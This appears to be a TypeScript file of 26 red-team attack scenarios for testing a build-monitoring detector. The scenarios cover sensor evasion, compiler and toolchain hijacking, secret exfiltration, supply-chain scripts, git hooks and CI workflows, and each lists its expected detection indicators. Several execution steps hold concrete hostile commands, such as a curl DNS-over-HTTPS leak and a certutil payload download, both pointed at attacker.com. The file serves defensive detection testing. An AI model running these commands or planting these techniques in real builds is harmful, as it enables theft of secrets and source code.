// ── Red Team Attack Scenarios ────────────────────────────────
// 15 reproducible attack scenarios across 8 campaigns

import { RedTeamAttack } from './redteam-types'

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 1: SENSOR EVASION
// Objective: Can a process act without being observed?
// ══════════════════════════════════════════════════════════════

export const ATTACK_01_SYSCALL_DIRECT: RedTeamAttack = {
  id: 'ATK-001',
  name: 'Direct Syscall (ETW Bypass)',
  description: 'Bypass userland hooks by making direct syscalls, avoiding ETW observation',
  mitreId: 'T1106',
  campaign: 'sensor-evasion',
  severity: 'critical',
  platform: 'windows',
  setup: [
    'Compile a program that uses NtCreateUserProcess directly',
    'Link against ntdll.dll but call via syscall instruction',
    'Bypass kernel32.dll and kernelbase.dll entirely',
  ],
  execution: [
    'Execute the direct-syscall binary',
    'Process creation should be invisible to ETW userland providers',
    'File I/O via NtCreateFile syscall',
  ],
  cleanup: ['Remove compiled binary'],
  expectedIndicators: ['NtCreateUserProcess', 'syscall', 'ntdll.dll'],
  expectedEvidenceTypes: ['PROCESS_CREATED', 'PROCESS_SPAWNED'],
}

export const ATTACK_02_ETW_PATCH: RedTeamAttack = {
  id: 'ATK-002',
  name: 'ETW Provider Patching',
  description: 'Patch EtwEventWrite in memory to disable ETW logging for the process',
  mitreId: 'T1562.006',
  campaign: 'sensor-evasion',
  severity: 'critical',
  platform: 'windows',
  setup: [
    'Write a loader that patches EtwEventWrite to return immediately',
    'Use VirtualProtect to make .text writable',
    'Overwrite first bytes with RET instruction',
  ],
  execution: [
    'Patch ETW before any detection logic runs',
    'Execute malicious payload',
    'ETW events for this process are silenced',
  ],
  cleanup: ['Process termination restores ETW'],
  expectedIndicators: ['VirtualProtect', 'EtwEventWrite', 'patch'],
  expectedEvidenceTypes: ['ENV_CHANGED', 'PROCESS_CREATED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 2: IDENTITY EVASION
// Objective: Can it impersonate a legitimate tool?
// ══════════════════════════════════════════════════════════════

export const ATTACK_03_FAKE_GCC: RedTeamAttack = {
  id: 'ATK-003',
  name: 'Fake GCC Wrapper',
  description: 'Create a fake gcc.exe that compiles normally but also exfiltrates source code',
  mitreId: 'T1036',
  campaign: 'identity-evasion',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create gcc.exe wrapper in a priority PATH directory',
    'Wrapper reads all .c/.h files passed as arguments',
    'Wrapper forwards to real gcc after copying source',
    'Open socket and upload copied source before gcc runs',
  ],
  execution: [
    'Run "gcc main.c -o main"',
    'Wrapper intercepts: copies main.c, uploads, then compiles',
    'Build succeeds normally',
    'Source code is exfiltrated',
  ],
  cleanup: ['Remove fake gcc.exe', 'Remove uploaded source'],
  expectedIndicators: ['gcc.exe', 'socket', 'file read', 'PATH priority'],
  expectedEvidenceTypes: ['TOOL_INVOKED', 'FILE_READ', 'NETWORK_CONNECT', 'NETWORK_UPLOAD'],
}

export const ATTACK_04_COMPILER_WRAPPER: RedTeamAttack = {
  id: 'ATK-004',
  name: 'Compiler Wrapper (tsc wrapper)',
  description: 'Wrap tsc.exe to inject code into compiled output while passing all checks',
  mitreId: 'T1554',
  campaign: 'identity-evasion',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create tsc-wrapper.exe that sits before real tsc in PATH',
    'Wrapper invokes real tsc with original arguments',
    'After compilation, wrapper modifies output .js files',
    'Injection adds obfuscated reverse shell to compiled output',
  ],
  execution: [
    'Run "tsc src/main.ts"',
    'Wrapper compiles normally via real tsc',
    'Post-compile: wrapper patches dist/main.js with backdoor',
    'Output looks identical to legitimate build',
  ],
  cleanup: ['Remove wrapper', 'Restore original output files'],
  expectedIndicators: ['tsc-wrapper.exe', 'file modification', 'PATH priority', 'post-compile patch'],
  expectedEvidenceTypes: ['TOOL_INVOKED', 'COMPILER_STARTED', 'COMPILER_FINISHED', 'ARTIFACT_MODIFIED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 3: SECRET EXFILTRATION
// Objective: Can it extract secrets without normal sockets?
// ══════════════════════════════════════════════════════════════

export const ATTACK_05_LD_PRELOAD: RedTeamAttack = {
  id: 'ATK-005',
  name: 'LD_PRELOAD read() Interception',
  description: 'Use LD_PRELOAD to intercept read() calls and steal secrets transparently',
  mitreId: 'T1574.006',
  campaign: 'secret-exfiltration',
  severity: 'critical',
  platform: 'linux',
  setup: [
    'Compile shared library that hooks read() function',
    'Hook reads first N bytes, copies to hidden buffer',
    'After read completes, forward to real read()',
    'Hidden buffer is flushed to attacker via UDP when full',
  ],
  execution: [
    'Set LD_PRELOAD=./libsteal.so before build process',
    'Every read() call (including .env, config, secrets) is intercepted',
    'Data is exfiltrated via UDP (no TCP handshake, no connection log)',
    'Application behaves normally',
  ],
  cleanup: ['Remove libsteal.so', 'Unset LD_PRELOAD'],
  expectedIndicators: ['LD_PRELOAD', 'read() hook', 'UDP exfil'],
  expectedEvidenceTypes: ['ENV_CHANGED', 'SECRET_ACCESSED', 'NETWORK_UPLOAD'],
}

export const ATTACK_06_NAMED_PIPE_EXFIL: RedTeamAttack = {
  id: 'ATK-006',
  name: 'Named Pipe Secret Exfiltration',
  description: 'Exfiltrate secrets via named pipes instead of network sockets',
  mitreId: 'T1570',
  campaign: 'secret-exfiltration',
  severity: 'high',
  platform: 'windows',
  setup: [
    'Create named pipe: \\\\.\\pipe\\sentinel-logs',
    'Design pipe to look like legitimate logging pipe',
    'Write secret data to pipe in small chunks',
    'Secondary process reads pipe and forwards via DNS',
  ],
  execution: [
    'Build process reads .env file',
    'Secret values written to named pipe',
    'No network socket is opened for the exfiltration',
    'Pipe data appears as normal IPC traffic',
  ],
  cleanup: ['Close named pipe', 'Remove secondary process'],
  expectedIndicators: ['named pipe', 'CreateNamedPipe', 'ConnectNamedPipe'],
  expectedEvidenceTypes: ['SECRET_ACCESSED', 'SECRET_EXFILTRATED', 'FILE_WRITTEN'],
}

export const ATTACK_07_DNS_EXFIL: RedTeamAttack = {
  id: 'ATK-007',
  name: 'DNS Exfiltration (DoH/DoT)',
  description: 'Exfiltrate data via DNS queries using DoH/DoT to avoid plaintext inspection',
  mitreId: 'T1071.004',
  campaign: 'secret-exfiltration',
  severity: 'high',
  platform: 'all',
  setup: [
    'Base64 encode stolen data into subdomain labels',
    'Format: <encoded_data>.attacker.com',
    'Use DNS-over-HTTPS to resolver (1.1.1.1/dns-query)',
    'No plaintext DNS visible on network',
  ],
  execution: [
    'Read secret from .env',
    'Encode as base64 subdomain',
    'Send DNS query via DoH: curl https://1.1.1.1/dns-query -d "name=<b64>.attacker.com&type=TXT"',
    'No traditional network upload occurs',
  ],
  cleanup: ['Clear DNS cache'],
  expectedIndicators: ['DoH', 'base64 subdomain', 'TXT query', 'dns-query endpoint'],
  expectedEvidenceTypes: ['NETWORK_DNS_QUERY', 'NETWORK_UPLOAD', 'SECRET_ACCESSED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 4: TOOLCHAIN HIJACK
// Objective: Can it modify the compiler without detection?
// ══════════════════════════════════════════════════════════════

export const ATTACK_08_DLL_INJECTION: RedTeamAttack = {
  id: 'ATK-008',
  name: 'DLL Injection into tsc.exe',
  description: 'Inject malicious DLL into TypeScript compiler process',
  mitreId: 'T1055.001',
  campaign: 'toolchain-hijack',
  severity: 'critical',
  platform: 'windows',
  setup: [
    'Compile malicious DLL with DllMain entry point',
    'Use CreateRemoteThread + LoadLibrary to inject into tsc.exe',
    'DLL hooks compiler output to inject backdoor',
    'DLL also reads environment variables (potential secrets)',
  ],
  execution: [
    'Start tsc.exe compilation',
    'Injector process attaches to tsc.exe',
    'DLL loaded into tsc.exe address space',
    'Compilation proceeds normally with backdoor injected',
  ],
  cleanup: ['Terminate injector', 'DLL unloaded on process exit'],
  expectedIndicators: ['CreateRemoteThread', 'LoadLibrary', 'WriteProcessMemory', 'DLL'],
  expectedEvidenceTypes: ['PROCESS_SPAWNED', 'ENV_CHANGED', 'COMPILER_STARTED', 'ARTIFACT_MODIFIED'],
}

export const ATTACK_09_RESPONSE_FILE: RedTeamAttack = {
  id: 'ATK-009',
  name: 'Response File Poisoning',
  description: 'Modify compiler response files to inject additional source files',
  mitreId: 'T1554',
  campaign: 'toolchain-hijack',
  severity: 'high',
  platform: 'all',
  setup: [
    'Monitor for .rsp (response) files created during build',
    'Between creation and compiler reading, inject extra source files',
    'Injected files contain backdoor code',
    'Compiler compiles everything including injected files',
  ],
  execution: [
    'Build process creates response file',
    'Race condition: modify response file before compiler reads it',
    'Compiler includes injected source files',
    'Output contains backdoor alongside legitimate code',
  ],
  cleanup: ['Restore original response file'],
  expectedIndicators: ['response file', 'race condition', 'file modification'],
  expectedEvidenceTypes: ['FILE_MODIFIED', 'COMPILER_STARTED', 'ARTIFACT_CREATED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 5: GRAPH POISONING
// Objective: Can it build a misleading evidence graph?
// ══════════════════════════════════════════════════════════════

export const ATTACK_10_LOLBINS: RedTeamAttack = {
  id: 'ATK-010',
  name: 'Living off the Land Binaries',
  description: 'Use only legitimate system tools to perform malicious actions',
  mitreId: 'T1218',
  campaign: 'graph-poisoning',
  severity: 'high',
  platform: 'windows',
  setup: [
    'No malware deployed',
    'Only use: powershell, certutil, msbuild, regsvr32, rundll32',
    'Chain legitimate tools to achieve malicious goal',
  ],
  execution: [
    'certutil.exe -urlcache -split -f http://attacker.com/payload.exe',
    'powershell.exe -enc <base64_download_command>',
    'msbuild.exe payload.xml (compiles and runs C# payload)',
    'All tools are signed by Microsoft',
    'Graph shows only "known" tools',
  ],
  cleanup: ['Clear certutil cache', 'Remove payload.xml'],
  expectedIndicators: ['certutil download', 'powershell encoded', 'msbuild execution'],
  expectedEvidenceTypes: ['TOOL_INVOKED', 'DOWNLOAD', 'SCRIPT_EXECUTED', 'COMPILER_STARTED'],
}

export const ATTACK_11_TIMING_ATTACK: RedTeamAttack = {
  id: 'ATK-011',
  name: 'Race Condition (Temp File Destruction)',
  description: 'Destroy temp files before Sentinel reads them for graph construction',
  mitreId: 'T1070.004',
  campaign: 'graph-poisoning',
  severity: 'medium',
  platform: 'all',
  setup: [
    'Monitor Sentinel\'s graph construction timing',
    'Create temp files with malicious content',
    'Delete temp files immediately after Sentinel logs them',
    'Graph edges become orphaned (source node exists, target deleted)',
  ],
  execution: [
    'Build process creates temp files',
    'Attacker deletes temp files between Sentinel reads',
    'Evidence graph has dangling references',
    'Graph analysis produces incomplete results',
  ],
  cleanup: [],
  expectedIndicators: ['temp file deletion', 'orphaned nodes', 'dangling edges'],
  expectedEvidenceTypes: ['FILE_CREATED', 'FILE_DELETED', 'ARTIFACT_HASH_CHANGED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 6: ML POISONING
// Objective: Can it corrupt the learning model?
// ══════════════════════════════════════════════════════════════

export const ATTACK_12_LEARNING_POISON: RedTeamAttack = {
  id: 'ATK-012',
  name: 'Corpus Poisoning (10k Normal Builds)',
  description: 'Submit thousands of normal builds with subtle network uploads to normalize exfiltration',
  mitreId: 'T1565.001',
  campaign: 'ml-poisoning',
  severity: 'critical',
  platform: 'all',
  setup: [
    'Create script that generates 10,000 build records',
    'Each record: normal toolchain, normal processes, normal files',
    'Add exactly 1 network upload per build (small, 1-5KB)',
    'Upload appears as "npm registry" or "package download"',
  ],
  execution: [
    'Run 10,000 builds through Sentinel',
    'Each build is labeled "clean" by human reviewer',
    'Model learns: 1 upload per build = normal',
    'After poisoning, real exfiltration uploads are not flagged',
  ],
  cleanup: ['Corpus remains poisoned until manual cleanup'],
  expectedIndicators: ['10k builds', '1 upload each', 'clean labels', 'model drift'],
  expectedEvidenceTypes: ['NETWORK_UPLOAD', 'NETWORK_CONNECT'],
}

export const ATTACK_13_ADVERSARIAL_FEATURES: RedTeamAttack = {
  id: 'ATK-013',
  name: 'Adversarial Feature Optimization',
  description: 'Optimize attack to keep all 69 features within normal ranges while exfiltrating',
  mitreId: 'T1027',
  campaign: 'ml-poisoning',
  severity: 'high',
  platform: 'all',
  setup: [
    'Analyze Sentinel\'s 69-feature TrustFeatureVector',
    'Identify normal ranges for each feature',
    'Design attack to stay within all normal ranges',
    'Key constraints: graph density, entropy, fan-out, depth, confidence',
  ],
  execution: [
    'Exfiltrate data slowly (1 byte per 1000 legitimate operations)',
    'Maintain normal process count, file ops, network connections',
    'Keep graph structure similar to previous clean builds',
    'Trust score remains above 80 (CLEAN)',
  ],
  cleanup: [],
  expectedIndicators: ['feature bounds', 'normal ranges', 'adversarial optimization'],
  expectedEvidenceTypes: ['NETWORK_UPLOAD', 'SECRET_ACCESSED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 7: TIMELINE CONFUSION
// Objective: Can it break temporal correlation?
// ══════════════════════════════════════════════════════════════

export const ATTACK_14_BUILD_FRAGMENTATION: RedTeamAttack = {
  id: 'ATK-014',
  name: 'Build Fragmentation (3-Build Attack)',
  description: 'Split attack across 3 separate builds, each innocent alone',
  mitreId: 'T1074.002',
  campaign: 'timeline-confusion',
  severity: 'high',
  platform: 'all',
  setup: [
    'Build 1: Read secret from .env, store in hidden location',
    'Build 2: Encode secret, write to build artifact',
    'Build 3: Upload artifact to external server',
  ],
  execution: [
    'Run Build 1: "npm run build" — reads .env (normal)',
    'Run Build 2: "npm run encode" — encodes data (normal)',
    'Run Build 3: "npm run deploy" — uploads artifact (normal)',
    'Each build individually: trust score > 80',
    'Combined: full secret exfiltration',
  ],
  cleanup: ['Remove hidden storage', 'Remove encoded artifact'],
  expectedIndicators: ['3 builds', 'secret read', 'encode', 'upload'],
  expectedEvidenceTypes: ['SECRET_ACCESSED', 'FILE_WRITTEN', 'NETWORK_UPLOAD'],
}

export const ATTACK_15_SENSOR_CONFUSION: RedTeamAttack = {
  id: 'ATK-015',
  name: 'Sensor Confusion (ETW vs ProcFS vs eBPF)',
  description: 'Make different sensors report conflicting information',
  mitreId: 'T1562.006',
  campaign: 'timeline-confusion',
  severity: 'critical',
  platform: 'all',
  setup: [
    'ETW sees: process A created',
    'ProcFS sees: process B created',
    'eBPF sees: process C created',
    'Each sensor reports different PID, name, parent',
  ],
  execution: [
    'Use namespace manipulation to create process visible differently per sensor',
    'ETW reports original process',
    'ProcFS reports sandboxed process',
    'eBPF reports different cgroup',
    'Confidence propagation gets conflicting signals',
  ],
  cleanup: ['Process exits, all views converge'],
  expectedIndicators: ['sensor conflict', 'PID mismatch', 'name mismatch'],
  expectedEvidenceTypes: ['PROCESS_CREATED', 'PROCESS_SPAWNED'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 8: SUPPLY CHAIN ATTACKS
// Objective: Can it detect malicious package lifecycle scripts?
// ══════════════════════════════════════════════════════════════

export const ATTACK_16_NPM_POSTINSTALL: RedTeamAttack = {
  id: 'ATK-016',
  name: 'npm postinstall Exfiltration',
  description: 'Malicious postinstall script steals secrets during npm install',
  mitreId: 'T1059.004',
  campaign: 'supply-chain',
  severity: 'critical',
  platform: 'all',
  setup: [
    'Create npm package with postinstall script in package.json',
    'Script reads .env, package-lock.json, and node_modules/.package-lock.json',
    'Script uploads data to attacker server via HTTPS',
    'Package appears legitimate on npm registry',
  ],
  execution: [
    'Run: npm install malicious-package',
    'postinstall.js executes automatically',
    'Secrets exfiltrated before developer notices',
    'Build continues normally',
  ],
  cleanup: ['Remove package', 'Revoke exposed secrets'],
  expectedIndicators: ['postinstall', 'HTTPS upload', '.env read'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'SECRET_ACCESSED', 'NETWORK_UPLOAD'],
}

export const ATTACK_17_GRADLE_INIT_SCRIPT: RedTeamAttack = {
  id: 'ATK-017',
  name: 'Gradle Init Script Injection',
  description: 'Malicious Gradle init script executes during build',
  mitreId: 'T1059.006',
  campaign: 'supply-chain',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create init.gradle.kts in ~/.gradle/',
    'Script applies to all builds',
    'Executes custom Task that reads build config and exfiltrates',
  ],
  execution: [
    'Run any Gradle build',
    'Init script applies automatically',
    'Build config (including secrets in gradle.properties) exfiltrated',
    'Build succeeds normally',
  ],
  cleanup: ['Remove init.gradle.kts'],
  expectedIndicators: ['init.gradle', 'Task execution', 'gradle.properties read'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'SECRET_ACCESSED', 'NETWORK_UPLOAD'],
}

export const ATTACK_18_CARGO_BUILD_RS: RedTeamAttack = {
  id: 'ATK-018',
  name: 'Cargo build.rs Backdoor',
  description: 'Malicious build.rs in Rust crate executes during compilation',
  mitreId: 'T1059.007',
  campaign: 'supply-chain',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create Rust crate with malicious build.rs',
    'build.rs reads environment variables (including secrets)',
    'build.rs compiles and drops a second-stage payload',
    'build.rs modifies the final binary',
  ],
  execution: [
    'Run: cargo build',
    'build.rs executes before compilation',
    'Secrets from environment exfiltrated',
    'Binary contains backdoor',
  ],
  cleanup: ['Remove crate', 'Rebuild from clean source'],
  expectedIndicators: ['build.rs execution', 'env var access', 'binary modification'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'ENV_CHANGED', 'SECRET_ACCESSED', 'ARTIFACT_MODIFIED'],
}

export const ATTACK_19_MSBUILD_TASK: RedTeamAttack = {
  id: 'ATK-019',
  name: 'MSBuild Custom Task Injection',
  description: 'Malicious MSBuild .targets file executes custom Task during build',
  mitreId: 'T1059.007',
  campaign: 'supply-chain',
  severity: 'high',
  platform: 'windows',
  setup: [
    'Create .targets file with UsingTask element',
    'Task compiles C# code in-memory via CodeDom',
    'Task reads build config, environment, and network info',
    'Task exfiltrates via DNS TXT queries',
  ],
  execution: [
    'Run: msbuild solution.sln',
    'Custom Task executes during build',
    'Build config and environment exfiltrated',
    'Build succeeds normally',
  ],
  cleanup: ['Remove .targets file'],
  expectedIndicators: ['UsingTask', 'CodeDom compilation', 'DNS TXT exfil'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'COMPILER_STARTED', 'NETWORK_DNS_QUERY'],
}

export const ATTACK_20_MAVEN_PLUGIN: RedTeamAttack = {
  id: 'ATK-020',
  name: 'Maven Plugin Backdoor',
  description: 'Malicious Maven plugin executes during build lifecycle',
  mitreId: 'T1059.006',
  campaign: 'supply-chain',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create malicious Maven plugin with execution goal',
    'Plugin hooks into compile phase',
    'Plugin reads pom.xml (including server credentials)',
    'Plugin uploads credentials to attacker server',
  ],
  execution: [
    'Run: mvn compile',
    'Malicious plugin executes during compile phase',
    'pom.xml credentials exfiltrated',
    'Build succeeds normally',
  ],
  cleanup: ['Remove plugin from pom.xml', 'Revoke credentials'],
  expectedIndicators: ['plugin execution', 'pom.xml read', 'credential exfil'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'SECRET_ACCESSED', 'NETWORK_UPLOAD'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 9: GIT ATTACKS
// Objective: Can it detect malicious git hooks and configs?
// ══════════════════════════════════════════════════════════════

export const ATTACK_21_GIT_HOOKS: RedTeamAttack = {
  id: 'ATK-021',
  name: 'Git Hook Exfiltration',
  description: 'Malicious git hook steals code and secrets during normal git operations',
  mitreId: 'T1554',
  campaign: 'git-attacks',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create pre-commit hook in .git/hooks/',
    'Hook reads all staged files',
    'Hook uploads code to attacker server',
    'Hook also reads .env and SSH keys',
  ],
  execution: [
    'Developer runs: git commit -m "fix: update config"',
    'pre-commit hook executes silently',
    'All staged code and secrets exfiltrated',
    'Commit succeeds normally',
  ],
  cleanup: ['Remove malicious hook'],
  expectedIndicators: ['pre-commit hook', 'file read', 'HTTPS upload'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'FILE_READ', 'NETWORK_UPLOAD'],
}

export const ATTACK_22_GIT_CONFIG: RedTeamAttack = {
  id: 'ATK-022',
  name: 'Git Config Poisoning',
  description: 'Malicious git config redirects operations to attacker-controlled server',
  mitreId: 'T1554',
  campaign: 'git-attacks',
  severity: 'high',
  platform: 'all',
  setup: [
    'Modify .git/config to add custom transport helper',
    'Helper intercepts push/pull operations',
    'Helper copies all code to attacker server',
    'Helper also captures git credentials',
  ],
  execution: [
    'Developer runs: git push origin main',
    'Custom transport helper executes',
    'Repository code and credentials exfiltrated',
    'Push succeeds to original remote',
  ],
  cleanup: ['Restore original .git/config'],
  expectedIndicators: ['custom transport', 'credential capture', 'code exfil'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'SECRET_ACCESSED', 'NETWORK_UPLOAD'],
}

export const ATTACK_23_GIT_SUBMODULE: RedTeamAttack = {
  id: 'ATK-023',
  name: 'Git Submodule Attack',
  description: 'Malicious submodule executes code during git clone/update',
  mitreId: 'T1195.002',
  campaign: 'git-attacks',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create repository with malicious .gitmodules',
    'Submodule points to attacker-controlled repo',
    'Submodule has post-checkout hook that executes',
  ],
  execution: [
    'Developer runs: git clone --recursive repo',
    'Submodule is cloned and post-checkout hook executes',
    'Malicious code runs with developer permissions',
    'Original repo appears legitimate',
  ],
  cleanup: ['Remove submodule', 'Remove .gitmodules'],
  expectedIndicators: ['submodule clone', 'post-checkout hook', 'code execution'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'FILE_CREATED', 'NETWORK_UPLOAD'],
}

// ══════════════════════════════════════════════════════════════
// CAMPAIGN 10: CI ATTACKS
// Objective: Can it detect CI/CD pipeline compromise?
// ══════════════════════════════════════════════════════════════

export const ATTACK_24_GITHUB_ACTIONS: RedTeamAttack = {
  id: 'ATK-024',
  name: 'GitHub Actions Secret Exfiltration',
  description: 'Malicious GitHub Actions workflow steals repository secrets',
  mitreId: 'T1552.001',
  campaign: 'ci-attacks',
  severity: 'critical',
  platform: 'all',
  setup: [
    'Create .github/workflows/malicious.yml',
    'Workflow triggers on push to main',
    'Workflow reads GitHub token and repository secrets',
    'Workflow exfiltrates secrets via curl to attacker server',
  ],
  execution: [
    'Developer pushes to main branch',
    'GitHub Actions workflow triggers',
    'Secrets (GITHUB_TOKEN, AWS keys, etc.) exfiltrated',
    'Workflow logs appear normal (secrets masked)',
  ],
  cleanup: ['Remove workflow file', 'Rotate exposed secrets'],
  expectedIndicators: ['workflow trigger', 'secret access', 'curl exfil'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'SECRET_ACCESSED', 'NETWORK_UPLOAD'],
}

export const ATTACK_25_OIDC_FEDERATION: RedTeamAttack = {
  id: 'ATK-025',
  name: 'OIDC Federation Abuse',
  description: 'Abuse OIDC token federation to gain unauthorized cloud access',
  mitreId: 'T1550.001',
  campaign: 'ci-attacks',
  severity: 'critical',
  platform: 'all',
  setup: [
    'Configure GitHub Actions to assume AWS role via OIDC',
    'Malicious workflow requests OIDC token',
    'Token used to assume higher-privilege role',
    'Attacker accesses AWS resources',
  ],
  execution: [
    'Workflow requests OIDC token from GitHub',
    'Token exchanged for AWS temporary credentials',
    'Credentials used to access S3, Lambda, etc.',
    'AWS CloudTrail shows legitimate-looking access',
  ],
  cleanup: ['Revoke OIDC trust', 'Rotate AWS credentials'],
  expectedIndicators: ['OIDC token request', 'STS assume-role', 'unusual AWS access'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'NETWORK_CONNECT', 'SECRET_ACCESSED'],
}

export const ATTACK_26_COMPOSITE_ACTION: RedTeamAttack = {
  id: 'ATK-026',
  name: 'Malicious Composite Action',
  description: 'Poison a composite action to inject code into downstream workflows',
  mitreId: 'T1195.002',
  campaign: 'ci-attacks',
  severity: 'high',
  platform: 'all',
  setup: [
    'Create malicious composite action in public repository',
    'Action appears legitimate (e.g., "setup-node")',
    'Action injects malicious code into PATH',
    'Downstream workflows execute injected code',
  ],
  execution: [
    'Victim workflow uses: uses: attacker/setup-node@v1',
    'Composite action executes malicious setup script',
    'Malicious code runs with workflow permissions',
    'Secrets and code exfiltrated',
  ],
  cleanup: ['Pin action to commit SHA', 'Remove malicious action'],
  expectedIndicators: ['composite action', 'PATH modification', 'code injection'],
  expectedEvidenceTypes: ['SCRIPT_EXECUTED', 'ENV_CHANGED', 'NETWORK_UPLOAD'],
}

// ── All attacks ───────────────────────────────────────────────
export const ALL_ATTACKS: RedTeamAttack[] = [
  // Original 15
  ATTACK_01_SYSCALL_DIRECT,
  ATTACK_02_ETW_PATCH,
  ATTACK_03_FAKE_GCC,
  ATTACK_04_COMPILER_WRAPPER,
  ATTACK_05_LD_PRELOAD,
  ATTACK_06_NAMED_PIPE_EXFIL,
  ATTACK_07_DNS_EXFIL,
  ATTACK_08_DLL_INJECTION,
  ATTACK_09_RESPONSE_FILE,
  ATTACK_10_LOLBINS,
  ATTACK_11_TIMING_ATTACK,
  ATTACK_12_LEARNING_POISON,
  ATTACK_13_ADVERSARIAL_FEATURES,
  ATTACK_14_BUILD_FRAGMENTATION,
  ATTACK_15_SENSOR_CONFUSION,
  // New: Supply Chain (ATK-016 to ATK-020)
  ATTACK_16_NPM_POSTINSTALL,
  ATTACK_17_GRADLE_INIT_SCRIPT,
  ATTACK_18_CARGO_BUILD_RS,
  ATTACK_19_MSBUILD_TASK,
  ATTACK_20_MAVEN_PLUGIN,
  // New: Git Attacks (ATK-021 to ATK-023)
  ATTACK_21_GIT_HOOKS,
  ATTACK_22_GIT_CONFIG,
  ATTACK_23_GIT_SUBMODULE,
  // New: CI Attacks (ATK-024 to ATK-026)
  ATTACK_24_GITHUB_ACTIONS,
  ATTACK_25_OIDC_FEDERATION,
  ATTACK_26_COMPOSITE_ACTION,
]
